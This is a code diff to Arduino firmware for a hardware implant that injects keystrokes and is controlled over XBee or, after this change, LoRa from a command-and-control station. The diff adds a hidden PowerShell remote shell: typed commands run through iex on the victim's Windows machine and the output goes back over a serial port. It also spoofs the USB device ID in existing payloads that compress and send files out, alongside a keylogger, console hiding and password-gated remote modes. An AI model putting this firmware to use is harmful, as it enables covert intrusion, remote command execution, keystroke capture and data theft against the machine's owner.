@@ -61,6 +61,11 @@ String terminalPWOFF = "DEFAULTterminalPWOFF";      //password for ending a remo
 String exfilPW = "DEFAULTexfilPW";                  //password for copying files from a windows victim to the C2            - main menu option 13
 String exfilPWOFF = "DEFAULTexfilPWOFF";            //password for ending copying files from a windows victim to the C2     - main menu option 13
 String exfilPWSD = "DEFAULTexfilPWSD";              //password for copying files from a windows victim to the SD Card       - main menu option 14
+String shellPW = "DEFAULTshellPW";                  //password for hardcoded PS COM Shell script injection                  - main menu option ??
+
+//LoRa variables
+bool setLoRa = false;
+int loraTargetID = 1;
 
 //Toggle variables
 bool activate = false; // allow outgoing communication with C2 but do not accept commands until activated via C2 menu with the proper password
@@ -129,22 +134,22 @@ void loop() {
     if (terminalMode) {
         if (Serial.available() > 0) {
         incoming1 = Serial.readString();
-        Serial1.print(incoming1);
+        txData(incoming1);
         Serial1.flush();
         delay(2000);
         
       }
     }
     
-      if (exfilMode) {
+    if (exfilMode) {
         exfilStartVar = false;
         if (Serial.available() > 0) {
         incoming1 = Serial.readString();
-        Serial1.print(incoming1);        
+        txData(incoming1);        
       }
     }
     
-              if (exfilModeSD) {
+    if (exfilModeSD) {
         exfilStartVarSD = false;
         if (Serial.available() > 0) {
         
@@ -157,7 +162,6 @@ void loop() {
       }
     }
     
- 
 #ifdef Serial
   if (Serial.available() > 0) {
     char c = Serial.read();
@@ -252,7 +256,7 @@ void loop() {
   
   //rx incoming from xbee
   if (Serial1.available()) {
-    incoming = Serial1.readString();
+    incoming = rxData(Serial1.readString());
     Serial.println(incoming);
     // if activate == false, the implant will ignore all commands until the matching activatePW is provided
     if (activate) {
@@ -293,7 +297,7 @@ void setMode(String pass){
     Serial.println(pass);
     SD.remove(pass);
     Serial.println("File removed");
-    Serial1.println("File removed");
+    //txData("File removed\r\n");
     deleteScript = false;
   }else if (keyinject == true) {
     Serial.println("Key Inject is set to true");
@@ -350,7 +354,11 @@ void setMode(String pass){
     File root = SD.open("/SCRIPTS/");
     String rootDir = "/";
     printScripts(root, rootDir);
-    Serial1.println("<<<End of Message>>>");
+    if (setLoRa){
+      txData("<<<End of Message>>>");
+    } else {
+      txData("<<<End of Message>>>\r\n");
+    }
     Serial1.flush();
     keyinject = true;
 
@@ -364,7 +372,11 @@ void setMode(String pass){
     File root = SD.open("/");
     String rootDir = "/";
     printScripts(root, rootDir);
-    Serial1.println("<<<End of Message>>>");
+    if (setLoRa){
+      txData("<<<End of Message>>>");
+    } else {
+      txData("<<<End of Message>>>\r\n");
+    }
     Serial1.flush();
     deleteScript = true; 
   }else if (pass == sendKeysPW){
@@ -373,7 +385,11 @@ void setMode(String pass){
     File root = SD.open("/Data/");
     String rootDir = "/";
     printScripts(root, rootDir);
-    Serial1.println("<<<End of Message>>>");
+    if (setLoRa){
+      txData("<<<End of Message>>>");
+    } else {
+      txData("<<<End of Message>>>\r\n");
+    }
     Serial1.flush();
     sendKeyFile = true;
   }else if (pass == printFilesPW){
@@ -382,7 +398,11 @@ void setMode(String pass){
     File root = SD.open("/");
     String rootDir = "/";
     printScripts(root, rootDir);
-    Serial1.println("<<<End of Message>>>");
+    if (setLoRa){
+      txData("<<<End of Message>>>");
+    } else {
+      txData("<<<End of Message>>>\r\n");
+    }
     Serial1.flush();
   }
    
@@ -390,7 +410,11 @@ void setMode(String pass){
     // set terminalMode to true to initiate a remote powershell terminal on a windows victim
     Serial.println("TERMINAL");
     terminalMode = true;
-    Serial1.println("<<<End of Message>>>");
+    if (setLoRa){
+      txData("<<<End of Message>>>");
+    } else {
+      txData("<<<End of Message>>>\r\n");
+    }
     Serial1.flush();
     }
 
@@ -430,6 +454,9 @@ void setMode(String pass){
     exfilStartVar = false;
     Serial1.flush();
     }
+   else if (pass == shellPW){
+    shellStart();
+   }
  
 }
 
@@ -469,7 +496,6 @@ void wipeCard(File dir, String d) {
 }
 
 void exfilStart(String n) {
-  
 exfilStartVar = false;
 inject("ps-LEFT_GUI");
 inject("dl-250");
@@ -479,9 +505,9 @@ inject("pt-powershell.exe");
 inject("dl-250");
 inject("ps-RETURN");
 inject("ra-");
-inject("dl-500");
+inject("dl-2000");
   String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
-  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_2341&PID_8057&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
+  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
   inject(exfilHide);
   delay(1000);
   inject("ps-RETURN");
@@ -495,7 +521,32 @@ inject("dl-500");
   exfilStartVar = false;
   exfilMode = true;
   Serial1.flush();
+}
 
+void shellStart() {
+inject("dl-500");
+inject("ps-LEFT_GUI");
+inject("dl-250");
+inject("ra-");
+inject("dl-1000");
+inject("pt-powershell.exe");
+inject("dl-250");
+inject("ps-RETURN");
+inject("ra-");
+inject("dl-500");
+  String shellHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
+  String shellCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();while($port.IsOpen){$data = $port.ReadExisting();$datareal = $datareal + $data;if ($datareal -Match \"<<ENDD>>\") {$datareal = $datareal.Replace(\"<<ENDD>>\",\"\");$sendback = (iex $datareal 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$port.WriteLine(\"~\"+$sendback2);$datareal = \"\";$data = \"\"};Hide-Console};";
+  inject(shellHide);
+  delay(1000);
+  inject("ps-RETURN");
+  inject(shellCode);
+  delay(1000);
+  inject("dl-500");
+  inject("ps-RETURN");
+  inject("ra-");
+  inject("ps-RETURN");
+  inject("ra-");
+  Serial1.flush();
 }
 
 void exfilStartSD (String n) {
@@ -510,7 +561,7 @@ inject("ps-RETURN");
 inject("ra-");
 inject("dl-1000");
   String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
-  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_2341&PID_8057&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
+  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_046D&PID_C31C&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
   inject(exfilHide);
   delay(1000);
   inject("ps-RETURN");
@@ -544,6 +595,7 @@ void recordKeys(String d){
   keyFile.close();
 }
 
+
 void sendKeyRecord(String n){
   String path = "/Data/" + n;
   File myFile = SD.open(path);
@@ -555,11 +607,12 @@ void sendKeyRecord(String n){
     while (myFile.available()){
       char data = myFile.read();
       if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
-
-        line.concat(data);
+        if (setLoRa==false){
+          line.concat(data); 
+        }
         Serial.print("Sending line: ");
         Serial.println(line);
-        Serial1.print(line);
+        txData(line);
         Serial1.flush();
         delay(50);
         line = "";
@@ -568,7 +621,11 @@ void sendKeyRecord(String n){
       }      
     }
   }
-  Serial1.println("<<<EOF>>>");
+  if (setLoRa==false) {
+    txData("<<<EOF>>>\r\n");
+  } else {
+    txData("<<<EOF>>>");
+  }
 }
 
 void printScripts(File dir, String d){
@@ -589,7 +646,11 @@ void printScripts(File dir, String d){
       dirname.concat(entry.name());
       Serial.print("Script found: ");
       Serial.println(dirname);
-      Serial1.println(dirname);
+      if (setLoRa){
+        txData(dirname);
+      } else {
+        txData(dirname+"\r\n");
+      }
       Serial1.flush();
       delay(200);
     }
@@ -634,12 +695,12 @@ void launchScript(String n) {
     }
     myFile.close();
     Serial.println("File was launched successfully");
-    Serial1.println("File was launched successfully");
+    txData("File was launched successfully\r\n");
     Serial1.flush();
   } else {
     myFile.close();
     Serial.println("There was an error reading the submitted script name");
-    Serial1.println("There was an error reading the submitted script name");
+    txData("There was an error reading the submitted script name\r\n");
     Serial1.flush();
   }
 }
@@ -679,25 +740,49 @@ void inject(String s){
 void getModes(){
   if (record){
     Serial.println("Key recorder mode: active");
-    Serial1.println("Key recorder mode: active");
+    if (setLoRa){
+      txData("Key recorder mode: active");
+    } else {
+      txData("Key recorder mode: active\r\n");
+    }
   } else {
     Serial.println("Key recorder mode: deactivated");
-    Serial1.println("Key recorder mode: deactivated");
+    if (setLoRa){
+      txData("Key recorder mode: deactivated");
+    } else {
+      txData("Key recorder mode: deactivated\r\n");
+    }
   }
 
   if (insomnia){
     Serial.println("Insomnia mode: active");
-    Serial1.println("Insomnia mode: active");
+    if (setLoRa){
+      txData("Insomnia mode: active");
+    } else {
+      txData("Insomnia mode: active\r\n");
+    }
   } else{
     Serial.println("Insomnia mode: deactived");
-    Serial1.println("Insomnia mode: deactived");
+    if (setLoRa){
+      txData("Insomnia mode: deactived");
+    } else {
+      txData("Insomnia mode: deactived\r\n");
+    }
   }
   String timer = getTimer();
   Serial.println(timer);
-  Serial1.println(timer);
+  if (setLoRa){
+    txData(timer);
+  } else {
+    txData(timer + "\r\n");
+  }
   Serial1.flush();
   delay(100);
-  Serial1.println("<<<End of Message>>>");
+  if (setLoRa) {
+    txData("<<<End of Message>>>");
+  } else {
+    txData("<<<End of Message>>>\r\n");
+  }
 }
 
 //
@@ -727,7 +812,7 @@ void saveScript(String n, String s){
 //
 
 void saveExfilSD(String n, String s){
-  Serial.println("attempting exfil SD save");
+  //Serial.println("attempting exfil SD save");
   if (SD.exists("/EXFIL/") == false){
     SD.mkdir("/EXFIL/");
   }
@@ -1347,7 +1432,7 @@ void txKeyPresses(byte txArray[81], byte count){
   if (message != ""){
     if (txArray[1] != 0) {
       Serial.print("Sending: ");Serial.println(message);
-      Serial1.print(message);
+      txData(message);
       Serial1.flush();
     }
   }
@@ -1411,4 +1496,62 @@ String timeMillis(unsigned long timeH, unsigned long timeM, unsigned long timeS,
 
   tempTime = "Last key press: " + String(tempTime);
   return tempTime;
+}
+
+void loraTx(int id, String payload){
+  //add 4 extra for \r\n at the end of the payload
+  int length = int(payload.length());
+  String data = "AT+SEND=";
+  data += id;
+  data.concat(',');
+  data += String(length);
+  data.concat(',');
+  data += payload;
+  Serial.print("TX message is: ");
+  Serial.println(data);
+  Serial1.print(data+"\r\n");
+  while (true){
+    if (Serial1.available()){
+      String msg = Serial1.readString();
+      Serial.print("Return Code: ");
+      Serial.print(msg);
+      if (msg == "+OK\r\n"){
+        break;
+      }
+    }
+  }
+}
+
+void txData(String payload){
+  if (setLoRa){
+    loraTx(loraTargetID, payload);
+  } else {
+    Serial1.print(payload);
+  }
+}
+
+String loraRxData (String loraMessage){
+  int startIndex = loraMessage.indexOf(',');
+  int endIndex = loraMessage.lastIndexOf(',');
+  String sub = loraMessage.substring(startIndex+1, endIndex);
+  startIndex = sub.indexOf(',');
+  endIndex = sub.lastIndexOf(',');
+  return sub.substring(startIndex+1, endIndex);
+}
+
+String rxData(String incomingMessage){
+  String rxSub = incomingMessage.substring(1, 4);
+  //Serial.print("Substring: ");
+  //Serial.println(rxSub);
+  if (rxSub == "RCV"){
+    setLoRa=true;
+    Serial.println("LoRa message detected");
+  } else {
+    setLoRa=false;
+  }
+  if (setLoRa){
+    return loraRxData(incomingMessage);
+  } else {
+    return incomingMessage;
+  }
 }
